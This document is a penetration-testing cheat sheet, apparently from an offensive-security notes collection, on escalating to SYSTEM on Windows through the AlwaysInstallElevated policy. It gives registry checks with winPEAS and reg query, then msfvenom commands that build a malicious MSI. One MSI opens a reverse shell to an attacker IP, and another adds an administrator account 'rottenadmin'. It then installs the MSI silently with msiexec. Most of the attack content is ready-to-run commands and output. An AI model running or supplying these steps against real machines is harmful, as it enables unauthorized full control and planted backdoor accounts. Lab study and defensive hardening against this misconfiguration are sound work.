# Options Install Windows
## Privilege escalation with `AlwaysInstallElevated` group policy
MSI files are package files used to install applications. These files run with the permissions of the user trying to install
them. Windows allows for these installers to be run with elevated (i.e. admin) privileges.

Windows can allow low privilege users to install *Microsoft Windows Installer Package (MSI)* with **`SYSTEM`** privileges by **AlwaysInstallElevated** group policy.
So, we can generate a malicious MSI file which contains a reverse shell.
### Prerequisites
The catch is that two Registry settings must be enabled for this to work (value is 0x1), then users of **any privilege** can install (execute) `*.msi` files as **NT AUTHORITY\SYSTEM**.

The **AlwaysInstallElevated** value must be set to 1 for both: 
- the local machine:
```console
HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
```
- the current user:
```console
HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
```
If either of these are missing or disabled, the exploit will not work.
### Exploitation
1. Use **winPEAS** to see if both registry values are set:
```console
> .\winPEASany.exe quiet windowscreds
����������͹ Checking AlwaysInstallElevated
 https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#alwaysinstallelevated
    AlwaysInstallElevated set to 1 in HKLM!
    AlwaysInstallElevated set to 1 in HKCU!
```
2. Alternatively, verify the values manually:
```console
> reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\Installer
    AlwaysInstallElevated    REG_DWORD    0x1
```
```console
> reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer
    AlwaysInstallElevated    REG_DWORD    0x1
```
3. Create a new reverse shell with msfvenom, this time using the **msi** format, and save it with the **.msi** extension:
```console
# msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.16.7 LPORT=8888 -f msi -o reverse.msi
```
or
```console
# msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
# msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac wont be prompted
```
4. Copy the reverse.msi across to the Windows VM, start a listener on Kali, and run the installer to trigger the exploit:
```console
> msiexec /quiet /qn /i C:\PrivEsc\reverse.msi
```
If you have a meterpreter session you can automate this technique using the module **`exploit/windows/local/always_install_elevated`**

*See an example at the Love machine - hackthebox*
